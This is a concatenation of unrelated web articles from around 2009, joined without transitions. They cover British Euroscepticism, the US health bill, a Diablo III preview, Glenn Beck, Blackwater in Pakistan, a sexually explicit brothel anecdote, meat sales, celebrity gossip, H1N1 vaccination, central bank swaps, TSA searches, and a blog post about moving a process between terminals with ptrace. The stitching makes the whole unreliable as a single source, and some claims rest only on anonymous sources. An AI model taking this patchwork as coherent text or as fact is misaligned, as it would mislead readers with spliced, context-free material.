‘ THE NEXT CONSERVATIVE GOVERNMENT WILL SEEK A ‘MANIFESTO MANDATE ’ FOR RENEGOTIATION ’.
Again , so far so unexpected .
But David Cameron promised to The Sun in 2007 that :
Today , I will give this cast - iron guarantee :
If I become PM a Conservative government will hold a referendum on any EU treaty that emerges from these negotiations .
That “ cast - iron guarantee ” is in tatters .
As Cameron himself said in the same article :
Small wonder that so many people do n’t believe a word politicians ever say if they break their promises so casually .
But what ’s most interesting in Tim Montgomerie ’s defence of Cameron ’s new position is this :
If Britain ’s relationship with the EU is fundamentally the same after five years of Conservative government the internal divisions that ended the last Tory period in government will look like a tea party in comparison .
That sounds rather like a thinly veiled threat to me .
Put his favoured MPs David Davis or John Redwood MP or else …
Tim Montgomerie has written a good article but its main purpose seems to be to try and neutralise a Tory grassroots revolt while giving a clear signal to Cameron that a battle is nevertheless looming .
Unfortunately the Eurosceptics may not be as easily neutralised as Montgomerie hopes .
Paul Waugh reports :
Dan Hannan , who has tried his best not to give the leadership difficulties over all of this , was blunt today however about the idea of abandoning the referendum .
Speaking on BBC ’s Politics Show , he was asked what would happen if Cameron ’s “ cast- iron pledge ” was dumped : “ That ’s a question you ’d have to put to him .
I mean , it ’s he who ’s given his word , not me . ” [ my italics ]
…
“ My own view remains that there must be a referendum and the case for a British referendum does not depend on what happens in the Czech Republic or Ireland or Poland or anywhere else . ”
That ’s a pretty stark rejection of the Cameron and Montgomerie position .
Over at the Wall Street Journal Iain Martin is similarly scathing :
David Cameron gave British voters a cast - iron guarantee on a referendum on Lisbon and that guarantee is being broken .
That may be because circumstances have changed , but still it ’s a pledge that ’s being abandoned , discarded or torn - up .
As a consequence , the word ‘ betrayal ’ is going to be bandied about rather a lot .
More importantly , he pours cold water on the strength of the Eurosceptic movement .
Euroscepticism in the UK is in serious trouble .
It is said the next Tory intake is overwhelmingly Eurosceptic and perhaps it is , but I suspect that will mean diddly - squat in the long - run .
The other two main parties are signed up to the EU consensus .
As a movement , Euroscepticism is a mess .
After the sceptics won the battle on a single currency ( which had as much to do with Gordon Brown ’s opposition as it did with their efforts ) the movement effectively decommissioned intellectually .
No enduring institutions or think - tanks were built to advance ideas for reform of the EU .
Beyond endless calls for a referendum , and the important interventions of a few figures such as Dan Hannan MEP , there was virtually nothing of any value .
Ouch !
Let the civil war commence .
As I noted earlier , the real surprise in the House health care bill was n’t the public plan–we had pretty much known for days that House Speaker Nancy Pelosi did n’t have the votes to pass her preferred version , the so - called “ robust ” public plan , which would have closely tied its reimbursements to health care providers to Medicare ’s rates ( which can run 30 % lower than what private insurance pays them ) .
So she had to settle for one that would operate in many ways like an insurance company , negotiating with hospitals and doctors and other health care providers , and paying them significantly more generous reimbursements .
It was that decision , I am told , that led to the real news in the bill–a provision , inserted at the last minute , to drastically expand the Medicaid program , even beyond what had been anticipated in an earlier version of the legislation .
Here ’s what happened :
Once the Speaker decided to go with the weaker version of the public option , she found herself with another problem .
Because the weaker version saved less money , she would have to find $ 85 billion , so the bill ’s 10 - year price tag could come in under the $ 900 - billion limit that President Obama had set .
One way to do that was to take 2.5 million people who would have been using government subisidies to buy insurance on the new “ exchanges ” that would be established under the bill , and shift them instead into the Medicaid program .
So instead of setting the qualifications for Medicaid at 133 % of poverty , as the legislation initially stipulated , the level was lifted to 150 % .
( In other words , where a family of four earning up to about $ 29,300 would have qualified for Medicaid under the initial version of the bill , the program now would accept a family earning up to about $ 33,000 a year ) .
Either way , you are seeing a dramatic expansion of the program , which is administered jointly with the states .
Currently , people in most states qualify not on the basis of income , but rather on a combination of income and some other criterion–such as being elderly , disabled , or pregnant .
Single adults are generally excluded from Medicaid if they do not also fit one of these other categories .
There are reasons to worry about the implications of putting millions of new people on the medicaid rolls .
Already , medicaid recipients in some parts of the country complain they cannot find doctors and other health care providers who are willing to accept the low reimbursements that medicaid pays .
However , House Energy and Commerce Committee Chairman Henry Waxman told me that there are a number of provisions in the bill that would aim to assure more health care providers for medicaid recipients .
One is a $ 12 - billion expansion of the community health centers program , which would more than double its capacity over the next five years , to handle 38.6 million people .
Another element of the legislation would boost the payments to primary care providers who accept medicaid patients , bringing their reimbursement rates in line with those paid by the medicare program .
While Waxman acknowledged that his own preference had been to put more people into the health insurance exchanges , he insisted that the shift is “ not a bad policy . ”
But one real fight ahead could be who will have to pay for all those new medicaid recipients .
The House bill would have the federal government paying 100 % of the costs for the first two years , and 91 % of it after that .
Under the legislation passed by the Senate Finance Committee , a far greater share would fall on the states –whose governors say their budgets could not take the additional strain .

2019 TTSP Speakers
We just played Diablo III .
For fifteen painfully brief minutes , our lady Barbarian tore through hordes of Fallen , clicking them back to the Hell they came from .
It was good .
Advertisement
The Gamescom ( and Blizzcon ) demo of Diablo III playable at Blizzard 's booth features the three announced classes : Wizard , Barbarian and Witchdoctor , with male and female options for each .
I opted for the Barbarian , what I assumed would be the easiest , most familiar introduction to Diablo III .
That assumption was correct .
Blizzard does n't seem to have mucked with the successful formula of click , kill and loot in the newest Diablo .
Our short journey started in the desert .
The demo begins in the Sundered Pass , a dusty zone that smacks of Lut Gholein 's desert lands in Diablo II .
Of course , the deserts in Diablo III look far better than those featured in the previous game , with visible winds carrying clouds of sand across the plains , dust storms kicking up around us .
The land is similarly populated with tiny desert creatures , snakes and insects that get trampled underfoot .
Advertisement
Our main quest in this desert land is to head to Alcarnus , as given to us by the lady Asheara , to see just what the hell is going on in that town .
Since Diablo 's back in town , things in Alcarnus are n't going too well .
You know , demons and stuff .
That 's what stood between us and Alcarnus — a hellish hot spot we actually never made it too .
Instead , we ran into a few side quests .
One sent us after the bounty of a man named Husam .
The price on his head was high , so we took his head .
It really only took one good whack from the maces we were dual - wielding .
After some backtalk from Husam , we bludgeoned him until his head popped off .
We started off with some good equipment , two maces , an axe , a shield , plus full armor .
We also had an Adventurer 's Backpack , which brought our Barbarian 's inventory to a cool 28 slots .
The inventory screen should look familiar to Diablo fans , but the newest version is far more streamlined .
When hovering over unequipped items in your inventory , you 'll see a pop up window with that item 's vital statistics and the item you currently have equipped in that slot .
That made it a lot easier to see if the leather pants we picked up at one point were better than the " lucky " leather pants we started out with .
They were .
A right click equipped them , draining our character 's luck , but upping her armor .
Advertisement
We were also equipped with two Barbarian skills , Ground Stomp and Battle Cry .
The former was hot - keyed to the " 2 " and , when enabled , stunned everything around the Barbarian .
Helpful , when Fallen are surrounding you and Fallen Shamen are tossing fireballs your way .
The Battle Cry , on the " 1 " key , increased our armor class temporarily .
If we were playing a multiplayer game , that Battle Cry effect would have been passed on to our party members .
But we were doing this quest solo .
The Barbarian 's other skill , Cleaver , was mapped to the right mouse button .
Click on it , and our lady brute did a two handed attack on two enemies at once , as long as they were side - by - side .
Again , handy when surrounded by Fallen and Sand Wasps .
Those Sand Wasps really suck , by the way , ejecting a quartet of mini-Wasps at our hero .
Nasty .
Advertisement
We ran into a few other nasty things in the desert , the most annoying of which was the Desert Dervish , a spinning tornado of a beast with a strong knock - back attack .
The demo offered a few side quests on our way to Alcarnus .
We ran into a " Crazed Miner , " who offered us the quest , " A Miner 's Gold . "
All we had to do was defend the miner while he raised a treasure chest via a pulley system .
When he started , swarms of Fallen came after him .
If we were successful in defending the miner from the swarm , we'd get half the gold .
It really was n't a challenge for the Barbarian , as Ground Stomp made that defense quest a simple task .
Advertisement
After that , we were quickly bested by a massive Fallen attack , as Shamans and other beasts piled upon us .
It seemed like the demo ramped up the difficulty quickly when the " Thanks for playing " popped up .
We could still play — and revive the dead Barbarian — but a Blizzard rep kicked us off .
From graphics to gameplay to interface adjustments , Blizzard seems to have delivered with Diablo III .
The game looks fantastic , dripping with atmospheric detail and gorgeous visual effects .
But honestly , it 's the user interface changes that are most exciting .
Blizzard has made the process of looting and equipping much more efficient , letting the player focus on the action .

We 'll have more hands on impressions of Diablo III from Gamescom — and soon from Blizzcon — in the coming days .
How seriously Congress has ever taken its responsibility to serve as a “ check and balance ” against the powers of the executive and judicial branches of the U.S. government is debatable , but it has certainly run pell - mell from those clearly delineated responsibilities in the past several decades : abdicating its sole power to declare war , enabling the rise of an imperial presidency throughout the 20th and into the 21st centuries , and culminating in its almost unanimous passage of the unread USA - PATRIOT
Act that granted the executive the near - total unitary power the Constitution ’s framers hoped to guard against .
The current health - care “ reform ” legislation thus represents but the latest of Congress ’s abusing its power to enact legislation while retaining none of the responsibility or accountability for overseeing the subsequent use of the power it delegates thereby .
The House version of the legislation grants a politically appointed committee ( the majority appointed by the president ) total discretion to design and implement all aspects of our future health care : who will be covered , for what care , at what cost ; who will pay ; what regulations will prevail .
The Senate version proposes to pay for the legislation through achieving huge imaginary savings from Medicare , and delegates to another politically appointed committee the power to recommend “ annual Medicare payment rates as well as other reforms ” [ emphasis added ] — and whose decisions would be approved and disapproved at the sole discretion of the president .
In sum , total control over the very lives and deaths of every American is being deputed to unaccountable committees vested with extraordinary powers .
Having now violated every principle of the doctrine of nondelegation , Congress can either be fired en masse or its actions repudiated by the Supreme Court .
I ’m taking no bets on either .

Have you heard what one of Obama ’s czars is saying now ?
Apparently this guy is out there telling people that he ’s assembled a council of advisers to chart a new course for America .
He wants to undo the last century of American history .
And he — get this — says the U.S. needs “ a hundred - year - plan ” and “ we need to start thinking like the Chinese ” !
Thinking like the who ?!
Holy cow — wait ’ till Glenn Beck hears about this creeping Maoism .
Bet you anything that Beck ’s going to tear “ Comrade Think Like the Chinese ” a new … what ?
Huh ?
It ’s who ?
Sorry .
Apparently the guy who ’s rolling out a Chinese - style hundred - year - plan is Glenn Beck .
That , anyway , is the line that Beck rolled out in Florida ’s Villages retirement community this weekend .
( Video above courtesy of Media Matters . )
He also previewed his next phase of political activism for the New York Times , saying that he will sponsor voter - registration drives , hold a series of conventions and aim to make his followers more politically active and effective before the 2010 midterms .
Of course , “ The Plan ” is also all tied to a book , coming to a store near you in August .
Said Beck in Florida , “ I am drafting plans now to bring us back to an America that our founders would understand . ”
What I ’ve heard so far of Beck ’s announcement is short of specifics .
But one thing I ’ve always admired about and boggled at with Beck is how he feels no need to soft - pedal the more out - there , National - Treasure - like elements of his worldview .
Such as , here , his adamant belief that America was run off the rails 100 years ago by the Progressives , and has been run down by a conspiracy of Republicans and Democrats trying to achieve a “ socialist utopia . ”
Say what you want about Beck , I have to admire the certitude of a man who believes he can organize a national movement by getting people pissed off at Teddy Roosevelt .
You ’ll probably hear a lot of comment about this in the coming days , weeks , or , I do n’t know , centuries , much of the talk focused on the question of Beck ’s sanity .
But I will take a stand here and say that I do not believe Glenn Beck is crazy .
I believe Glenn Beck is ill .
He suffers from a malady common among media celebrities : BelieveYourOwnHype-itis , an inflammation of the brain caused by too - credulous repeated readings of one ’s own press clippings .
The natural next step is for Beck to start talking in terms of glorious centuries , sounding increasingly like his own caricatures of hubristic Obamaite social revolutionaries .
Thus , a man who is basically a gifted political entertainer / prop comic has decided that he is , instead , the man to guide America through the next century .
( Or , as I ’m sure he ’d probably say , he ’s simply the guy helping the citizens of America to guide themselves to the next century , by unleashing their own energy and common sense .
Because the first rule of having a Messiah complex is to act like it ’s only a John the Baptist complex . )
Mind you , I ’m not judging Beck ’s “ plan ” pro or con simply on its merits , only because we have few details of it .
But the idea of a cable - news infotainment demagogue anointing himself the next savior / kingmaker of America has the potential to go very bad , become extremely entertaining or both .
I do n’t think Glenn Beck is about to run for President , simply because I do n’t believe that I have done anything to deserve being that lucky as a columnist .
But it does look like Fox News ’ self - proclaimed “ rodeo clown ” has now decided that he is , instead , the bull .
Atlus recently announced localization plans for Shin Megami Tensei : Strange Journey for the Nintendo DS .
The game , which received a 36 from Famitsu ( the highest score ever awarded to an SMT title ) , has been labeled a ‘ First Person Science Fiction RPG ’ and is set for a Spring 2010 release .
More info and a smattering of screenshots after the jump .
The game takes place in the near future when a strange black void has appeared in the South Pole of Earth .
Atlus has likened the game ’s mechanics to Shin Megami Tensei : Nocturne and has promised no fewer than 300 demons to “ bribe , coerce , and negotiate with . ”
So , Elder - Geeks , are you looking forward to this or do you think it ’ll be too much for a handheld ?

The Obama administration is using mercenaries with the firm formerly known as Blackwater to kidnap and assassinate high value targets in Pakistan , according to a published report .
The program , operated out of the US Joint Special Operations Command , “ is so ‘ compartmentalized ’ that senior figures within the Obama administration and the US military chain of command may not be aware of its existence , ” an unnamed source with direct knowledge of the program told The Nation reporter Jeremy Scahill .
ADVERTISEMENT
Xe Services , formerly known as Blackwater , is also allegedly involved in intelligence collection for a drone bombing campaign in the country .
Scahill ’s report added : “ A defense official , on background , specifically denied that Blackwater performs work on drone strikes or intelligence for JSOC in Pakistan .
‘ We do n’t have any contracts to do that work for us .
We do n’t contract that kind of work out , period , ’ the official said .
‘ There has not been , and is not now , contracts between JSOC and that organization for these types of services . ’
The previously unreported program , the military intelligence source said , is distinct from the CIA assassination program that the agency ’s director , Leon Panetta , announced he had canceled in June 2009 .
‘ This is a parallel operation to the CIA , ’ said the source .
‘ They are two separate beasts . ' ”
A Blackwater spokesman told The Nation that none of its forces are operating in Pakistan .
However , a “ former senior executive at Blackwater ” told Scahill that Xe ’s mercs are indeed working in Pakistan , sometimes employed by the country ’s government to operate alongside soldiers .
The arrangement allows the Pakistani government to deny any U.S. military presence in the country , while allowing them to tap former U.S. special forces members for high - risk missions .
Scahill added that the CIA is also employing the firm in parallel operations .
“ Targeted killings are not the most popular thing in town right now and the CIA knows that , ” Scahill ’s source reportedly said .
“ Contractors and especially JSOC personnel working under a classified mandate are not [ overseen by Congress ] , so they just do n’t care .
If there ’s one person they ’re going after and there ’s thirty - four people in the building , thirty - five people are going to die .
That ’s the mentality .
They ’re not accountable to anybody and they know that .
It ’s an open secret , but what are you going to do , shut down JSOC ? ”

During the Bush administration , the JSOC was reportedly being commanded by the vice president ’s office , effectively making them Dick Cheney ’s own “ executive assassination squad , ” according to investigative reporter Seymour Hersh .
President Obama ’s top official on the occupation of Afghanistan , General Stanley McChrystal , oversaw the JSOC from September 2003 to August 2008 .
The White House did not respond to a request for comment , Scahill reported .

Jaime Rascone is no different than the rest of us in that the erstwhile DJ needs to grab the occasional odd job to make ends meet .
But the Chilean lothario has beat all of us by holding the type of fantasy job that just sounds too good to be true : Quality Control in a brothel .
Rascone , an occasional male model and DJ , first happened upon Fiorella Companions in Santiago , Chile while working on a story about the country 's sexual revolution .
He was offered the gig by Madam Fiorella , who needed somebody to provide that final “ interview ” in her hiring process .
It goes like this : girls who are interested in working as VIP escorts for Fiorella have to undergo interviews , psychological testing , and a photo session .
The applicants are whittled down to a final six , who are then fucked one after the other in a single day by Jaime .
He takes diligent notes on , say , how they moved their hips and whether their groans were adequate , and makes recommendations to the madam .
There is even paperwork involved .
The strain of the job is actually such that he can only do it once a month , testing around seventy girls or so a year .
CHICAGO ( Reuters ) - Meat - loving consumers in the United States are eating out less , but they are not forgoing taste and quality as researchers have found that more restaurant - quality prime - and choice - grade steaks are being served on family dinner tables .
Beginning in 2008 , cash - strapped consumers shifted to at - home dining .
As a result , with restaurant business on the decline , meat companies are now shipping more of their restaurant fare to grocery stores and consumers are buying it , according to data presented on Thursday at the Worldwide Food Expo .
“ Before , if you wanted a great steak you had to go to a restaurant .
Now you can get it in the grocery store , ” Merrill Shugoll , president of Shugoll Research , told Reuters on the Expo sidelines .
Supermarket sales of all meat have improved this year , which had Shugoll optimistic for better sales ahead .
This improvement has been attributed to lower prices and to supermarkets aggressively marketing meat .
Shugoll and Michael Uetz , a principal at Midan Marketing , presented their survey results and separate marketing data , which showed a 12 percent increase in the volume of supermarket meat and poultry sales in the third quarter , compared with a year earlier .
However , they acknowledged that improvement compares with “ horrible ” 2008 sales .
The majority of respondents to an on - line survey , which was taken this autumn , said their meat and poultry purchases have increased or were unchanged since being polled in January .
The accompanying sales data showed sales remain strong for lower - priced meats such as ground beef , hot dogs , and chicken drumsticks .
But , there was a noticeable increase in sales of higher - priced premium meats .
The sales volume of the more expensive “ premium ” steaks was up 15.5 percent in the third quarter from a year ago , versus a 13.2 percent rise in “ regular ” steaks , they said .
Much of that increase is being attributed to supermarkets having greater access to higher quality meats .
Also stores have been running promotions to win customers during bad times so they will come back when the economy improves , said Uetz .
“ It all comes down to retailers seeing opportunity because food service is hurting , ” said Uetz .
Meat continues to be prominently featured in weekly newspaper advertisements and at attractive prices .
“ All of the data is looking positive for the meat and poultry industries and we are hoping that it will continue , ” Shugoll said of supermarket meat sales .
Eventually , meat prices should increase because production of beef , pork and chicken is down , said Uetz .
The smaller supply has not yet pushed up prices because consumers continue to control spending , but should the economy improve and demand stabilize , the smaller supply could mean higher prices , he said .

Check out this interview with former UFC light heavyweight champion Tito Ortiz up at his Big Bear training facility .
Tito talks UFC 106 , but his comments about UFC 104 are really the highlight of the interview .
Tito has no love for Lyoto Machida as he perceives Machida ’s “ elusiveness ” as running and tells Machida to be a man .
Ortiz is never at a loss for words , and has some interesting thoughts on the UFC 104 controversy between Mauricio Rua and Lyoto Machida .
On a side note , I think Ortiz looks great considering the long layoff .
He looks to be in the best shape of his career and is taking this fight very seriously .
Ortiz is arguably the only man happy about Brock Lesnar pulling out of UFC 106 as he gets to reclaim his main - event status .
Whether Ortiz wins or loses , he definitely has a long career after fighting as an analyst in my opinion .

The new Us Weekly reports that Kate Hudson has been trying to make New York Yankee Alex Rodriguez less of an egomaniac .
It must not be easy .
A former Rodriguez fling remembers seeing portraits of the slugger , 34 , as a centaur hanging over his bed .
" He was so vain , " his ex tells Us Weekly .
" He had not one , but two painted portraits of himself as a centaur .
You know , the half man , half horse figure ? "
Adds the ex , " It was ridiculous . "
Us Weekly also reports that Hudson , 30 — who has been front and center at his baseball games since they began dating this past spring — has been bragging to pals about what a good lover Rodriguez is .

WASHINGTON ( Sept. 1 , 2009 ) --
All military personnel will be vaccinated against the H1N1 flu virus , and the vaccine will be available to all military family members who want it , a Defense Department health affairs official said today .
The H1N1 vaccination program will begin in early October , said Army Lt. Col. ( Dr. ) Wayne Hachey , director of preventive medicine for Defense Department health affairs .
The vaccine , which has been licensed by the Food and Drug Administration , will be mandatory for uniformed personnel , Hachey said .
" What we want to do is target those people who are at highest risk for transmission , " he said .
Health - care workers , deploying troops , those serving on ships and submarines , and new accessions are at the top of the list .
" Any place where we take a lot of people , squash them all together and get them nice and close and put them under stressful conditions will get the vaccine first , " he said .
The department will use the usual seasonal flu vaccine distribution chain for the H1N1 , Hachey said , noting that while the mass H1N1 vaccinations are new to the general population , the process for vaccinating against seasonal flu is old hat for the Defense Department .
" We 've been doing this for decades , " he said .
" The system is tried and true .
" The department initially will receive 1 million doses of the H1N1 vaccine , and another 1.7 million doses later in October .
Officials do n't know yet whether people will need one dose or two , Hachey said .
" The assumption right now is that people will need two doses , 21 days apart , " he said .
" That may change . " FDA officials still are studying H1N1 and the vaccine , and the results should be known by the end of the month .
Seasonal flu vaccine already is available , and the Defense Department will begin giving those shots shortly , Hachey said .
" That has been our message to immunizers : to try and get as many people as they can immunized against the seasonal flu early , " he said .
Guidelines for giving priority to family members will follow those for the general population , Hachey said .
The Department of Health and Human Services is buying millions of doses of the vaccine .
" Installations are going to register with each state as an immunizer , " Hachey said .
" They will tell how many people they care for .
This includes dependents , retirees and so on .
" The Centers for Disease Control will place the order and will ship the vaccine where needed .
Family members will have multiple opportunities to get the vaccine , whether at Defense Department medical facilities or off post , Hachey said .
The CDC has established target groups for those at greatest risk for transmitting or being affected by the H1N1 .
They include pregnant women , health - care workers , those younger than 25 or older than 65 , and those with pre-existing health conditions .
Hachey said previous plans are serving the Defense Department well .
" We have been preparing for pandemic flu because of its potential impact on the mission , " he said .
The symptoms of the H1N1 flu are almost the same as the seasonal flu : fever , sore throat , runny nose , nausea , muscle aches and feeling rundown .
The 2009 H1N1 virus - formerly known as swine flu - is a pandemic virus , according to the World Health Organization .
U.S. officials call the virus " troubling " and urge communities across the United States to take actions to mitigate the effects of it .
The federal government is urging states and municipalities to begin preparing now for the fall flu season .
President Barack Obama addressed the H1N1 pandemic following a White House meeting today .
" As I said when we saw the first cases of this virus back in the spring , I do n't want anybody to be alarmed , but I do want everybody to be prepared , " he said .
" We know that we usually get a second , larger wave of these flu viruses in the fall , and so response plans have been put in place across all levels of government .
" But government cannot do it all , and the American people have a responsibility to stop the spread of the disease , Obama said .
" We need families and businesses to ensure that they have plans in place if a family member , a child or a co-worker contracts the flu and needs to stay home , " he said .
" And most importantly , we need everyone to get informed about individual risk factors , and we need everyone to take the common - sense steps that we know can make a difference , " the president said .
" Stay home if you 're sick .
Wash your hands frequently .
Cover your sneezes with your sleeve , not your hands .
And take all the necessary precautions to stay healthy .
I know it sounds simple , but it 's important and it works .
" The H1N1 is a never - before - seen combination of human , swine and avian flu viruses , officials said .
First detected in Mexico in February , it quickly spread around the world .
According to July WHO statistics , there have been 94,512 H1N1 cases worldwide , and 429 people have died from it .
In the United States , 33,902 contracted H1N1 , and 170 have died .

Money market tensions and international liquidity provision during the crisis
Raphael Auer , Sébastien Kraenzlin
The world ’s major central banks used underpublicised swap agreement to address mismatches in their currency - specific liquidity needs during the crisis .
This column says these measures where highly effective and came at a very low cost .
The recent crisis has triggered a wide spectrum of policy responses , including many policies that were unthinkable two years ago .
One of these unthinkable policies was the decision of the world 's major central banks to engage in reciprocal swap agreements , which involve a central bank handing out liquidity denominated in foreign currencies to its counterparties .
In this column , we document that these swap agreements have been a very effective tool in addressing the mismatch of banks ’ currency - specific liquidity needs .
In contrast to most other policies , these measures had no direct costs .
We also argue that the indirect cost – the loss of control over money supply – is highly contained since the spikes in the demand for foreign - denominated - funds are driven by liquidity demand shocks and are thus unlikely to have any inflationary effects . i
Systemic dollar and Swiss franc shortages during the crisis
In international currency markets , any bank can potentially obtain financing in any foreign currency by either directly going to the interbank market or by obtaining funds from its central bank and swapping the received funds into the foreign currency .
In principle , the latter should ensure banks lend to other banks at rates that do not depend on the transactional currency .
Recent market turmoil , however , has highlighted that interbank money markets have temporarily not functioned smoothly .
For example , Figure 1 documents the strains in the Swiss franc ( CHF ) money market arising in October 2008 .
The figure plots the difference between the unsecured and secured overnight interbank rate for CHF and euro funds .
While these two spreads are historically rather low and co-move closely , the spread on Swiss francs rose steeply during October 2008 , reaching values up to 300 basis points .
The spread between the unsecured and secured overnight interbank rate for euro funds experienced no such spike .
Figure 1 . Overnight interbank rate spread , Swiss franc vs. euro
The two horizontal lines correspond to the announcement ( bright blue line ) and the value date ( dark blue line ) of the EUR / CHF Foreign Exchange Swaps conducted by the SNB , ECB and NBP .
The Swiss - franc - specific spike in the cost of obtaining unsecured funds was caused by a combination of the need of foreign banks to continuously roll over maturing interbank loans and the drying up of supply for these funds .
Given that the Swiss franc is a low interest rate currency , it is commonly used in Central and Eastern Europe ( CEE ) and Austria in private households as an underlying currency for mortgages and other debt ( Auer and Wehrmüller2009 ) .ii
The banks active in these nations , in turn , finance a large share of their Swiss - franc - denominated loans on the unsecured interbank money market .
Many of those banks are domiciled outside Switzerland and do not have access to the Swiss repurchase agreement ( repo ) market and , consequently , increasingly turned to unsecured funding leading to the spike in the rates on this market .
In a calm market environment , all Swiss domestics banks , as well as a considerable number banks of domiciled outside Switzerland that do have access to the Swiss repo system , would have immediately exploited this profit opportunity and provided unsecured funds to banks without access to the repo system .
However , against the backdrop of the global financial crisis and the fear of counterparty default risk , this did not happen and the spread between secured and unsecured Swiss franc funds remained elevated for several trading days .
Since the lack of access to the Swiss repo system implies that even banks with ample collateral cannot necessarily obtain secured funding , the local central banks could not control these developments .
To overcome this market friction , the Swiss National Bank ( SNB ) jointly announced with the ECB and subsequently with the Narodowy Bank Polski and the Magyar Nemzeti Bankiii that all these central banks would directly distribute Swiss - franc - denominated funds to their counterparties .
Since nearly all banks that have to fund some Swiss franc exposure are registered with one of the four central banks and the conditions at which these funds are auctioned are equal , in effect the banking system instantly gained near universal access to primary source of Swiss francs , the SNB .
As can clearly be made out from Figure 1 , the Swiss franc tensions in the unsecured market ceased once the first EUR / CHF swap auctions were implemented by the partner central banks .
Similar currency - specific tensions had arisen in the market for US dollar ( USD ) funds already during September 2007 , which was addressed in December 2007 by the joint announcement of the Federal Reserve , the ECB , the SNB , the Bank of England , and the Bank of Canada .
The direct distribution of USD to banks domiciled outside the US was necessary to address the liquidity tensions arising from the substantial short USD position of European banks ( see Gyntelberg 2009 ) .
Liquidity tensions eased shortly after the first auctions of USD by the European central banks .
What is the cost of such agreements ?
Central banks can effectively address international liquidity mismatches using these international swap agreements , but what are the costs of these agreements ?
Since they are just a means to distribute liquidity more effectively , they involve no direct costs.iv
The main worry is that such swap agreements could create inflationary pressure since opening new means to distribute liquidity can increase the total demand for and consequently the supply of money .
Moreover , the maximum amount of a swap agreement is agreed upon several months in advance or may even be unlimited .
Since the receiving central bank may auction off the maximum amount but can only supply as much funds as are effectively demanded by its banking system , the uncertainty in the growth of the money supply increases .
v
There are , however , two main reasons why the loss of monetary control is rather contained .
First , the central bank that is originating the funds can sterilise the effect on the monetary supply by issuing own debt certificates or conducting liquidity - absorbing operations .
Second , even if complete sterilisation of excess liquidity is not possible , closer inspection of the volumes and maturities involved in the swap agreements show that the potential inflationary pressure is likely to be negligible .
In Figure 2 , we list the outstanding volume of USD repo outstanding in Switzerland at different maturities .
Once interbank tensions levelled off , central banks started to apply a penalty surcharge on the interest rate .
As shown , banks thereafter turned to the cheaper liquidity sources , namely the interbank market , and consequently the demand for foreign liquidity went to levels near zero .
The fact that demand for foreign - denominated - currency spikes only when liquidity tensions are high implies that the inflationary effect of these swap agreements is very contained .
When liquidity demand spikes , banks tend to hoard any funds they receive and increasing the money supply does not create inflationary pressure .
In contrast , in calm times , the swaps are not used since banks finance themselves on the interbank market .
Since swap agreements are essentially not used precisely in circumstances were increasing money supply would create inflationary pressure , their effect on inflation is minimal .
Figure 2 . Outstanding USD repo volume and maturities
Conclusion
When liquidity demand spikes , small frictions in the private sectors ' means of distributing liquidity internationally can have large effects on the interest rate paid .
While such international liquidity mismatches are of little concern at the current juncture , they could become elevated again .
Already now , the prospect of a global recovery is starting to lure investors back into the carry trade in currencies such as the Brazilian Real or the Australian Dollar ( see Shah 2009 ) , despite the high risk that such positions entail .
Also foreign - denominated loans in CEE and Austria – which came to a virtual halt in the face of the global financial crisis – might soon see a revival .vi
These developments have to be carefully scrutinised , since the stability of the financial system is far from being fully restored .
A revival of the carry trade could create tensions on international money markets .
However , central banks will refrain from making these swap agreements a permanent tool , as the refinancing of such high - risk positions should be conducted on the interbank market .
Footnotes
i The Study Group established by the Committee on the Global Financial System ( CGFS ) analysed the central bank ’s response to the money market tensions that emerged in August 2007 and how effective those responses were .
See BIS ( 2008 ) .
ii
The aggregate exposure of these nations to low - interest rate currencies has already caused losses of around 60 billion USD for these nations ( see Auer and Wehrmüller 2009 ) .
iii On 15 October 2008 , the SNB and the ECB jointly announced that they would conduct EUR / CHF swaps providing Swiss francs against euro .
The Narodowy Bank Polski and Magyar Nemzeti Bank joined the concerted auction starting 17 November 2008 and 2 February 2009 respectively .
iv A potential worry is that these agreements could entail a larger counterparty default risk .
This is not the case .
First , there is no risk involved for the central bank handing out the funds , since the receiving central banks guarantee these transactions .
Second , there is also no effect on counterparty default risk for the receiving central bank since it transacts with its regular counterparties against the regular range of eligible collateral or against another currency .
v
While giving away some control over monetary policy to other central banks is of little concern in the current low - inflation environment , such concerns will definitely become a first order political topic once inflationary pressures pick up and central banks have to refocus on their core task of maintaining price stability .
vi For example , despite the high risk entailed in these products , Kerschbaumer ( 2009 ) has argued in a nationwide Austrian newspaper has recently argued that Austria ’s financial supervisory bodies , the Finazmarktaufsicht and the Austrian National Bank , should discontinue their advise against the issuance of loans denominated in foreign currencies .

TSA has changed two rules about airport searches after an aide to Congressman Ron Paul recorded an incident on his iPhone .
The rules changes have prompted the ACLU to drop legal action against TSA on behalf of Steve Bierfeldt .
Bierfeldt was detained in March while attempting to board a plane at Lambert - St. Louis International Airport carrying $ 4,700 in cash .
TSA agents spent half an hour questioning him about why he was carrying so much cash , and Bierfeldt recorded the exchange on his iPhone .
Bierfeldt is the director of development for ' Campaign for Liberty ' , a group formed by Congressman Ron Paul 's after his failed presidential bid .
Bierfeldt attempted to send a metal box with the cash and checks through a metal detector at the airport , precipitating the confrontation .
The Washington Times reports that Bierfeldt questioned under what authority TSA detained him for carrying the cash .
At one point , a TSA officer asked Bierfeldt " Are you from this planet ? " and accused him of acting like a child for questioning his authority .
TSA spokeswoman Lauren Gaches said the new " internal directives " stipulate that TSA may not question why someone is carrying large amounts of cash through the airport .
The new rules say " screening may not be conducted to detect evidence of crimes unrelated to transportation security " and that large amounts of cash do not comprise a threat to an airliner .
The second directive says " traveling with large amounts of cash is not illegal . "
However , TSA said it would not release copies of the directives without a Freedom of Information request .
The ACLU had filed the suit on behalf of Bierfeldt because " We had been hearing of so many reports of TSA screeners engaging in wide - ranging fishing expeditions for illegal activities , " Ben Wizner , a staff lawyer for the ACLU , told the paper .
The new rules do not , however affect a situation where a TSA agent might come across illegal drugs , for instance , during the course of a routine screening .
This is my personal blog .
The views expressed on these pages are mine alone and not those of my employer .
I ’ve always wanted to be able to move a process from one terminal to another .
For example if I ’ve started a long - running foreground process ( such as irssi or scp ) outside of a screen and I have to log out my local terminal .
I looked around and there does n’t seem to be any way to do this .
There is a program called retty that I found later on that sort of does this , but it only closes and re-opens stdin / out et al .
It does n’t seem to do full terminal handling .
Nor does it seem to detach the original terminal .
It only allows you to peek into the process , control it for a bit , and then hand it back .
If you shut down the original terminal you ’re still screwed .
Attempt 1 : pass the fd for the real pty
I thought I could ptrace ( ) attach to the process , inject code to dup2 ( ) onto stdin / out / err , and do some ioctl ( ) s and that would be that .
No such luck as we shall see .
The easiest ( and most portable way ) to do it would be to dlopen ( ) a shared library that could then be written in C .
But then I would have to locate dlopen ( ) inside the running process , if it even had dlopen ( ) .
